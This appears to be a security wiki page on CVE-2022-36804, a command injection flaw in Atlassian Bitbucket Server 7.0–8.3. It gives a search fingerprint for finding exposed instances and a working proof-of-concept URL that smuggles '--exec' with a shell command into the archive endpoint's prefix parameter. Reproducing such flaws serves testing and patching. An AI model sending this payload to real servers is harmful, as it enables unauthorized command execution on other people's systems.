# Atlassian Bitbucket archive Remote Command Execution Vulnerability CVE-2022-36804

## Vulnerability Description

Atlassian issued a security bulletin that disclosed that Bitbucket Server and Data Center introduced a critical security vulnerability in version 7.0.0.

Bitbucket is a web-based version library hosting service provided by Atlassian, which supports Mercurial and Git version control systems. 

The official vulnerability announcement describes that there is a command injection vulnerability in multiple API endpoints of Bitbucket Server and Data Center. The vulnerability triggers the attacker with access to the public project or readable permissions to the private project, affecting the version from 7.0 to 8.3

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Atlassian Bitbucket  7.0ï½ž8.3</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">app="ATLASSIAN-Bitbucket"</span>

## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1663725817384-5de92389-3230-42e1-937c-f21a2db84194.png)

Verify POC

```sql
/rest/api/latest/projects/BIZEE/repos/bizee-communication-api/archive?filename=wN3Am&at=wN3Am&path=wN3Am&prefix=ax%00--exec=%60id%60%00--remote=origin
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1663725840976-179c5c01-3756-4090-83df-8dbb17e529c0.png)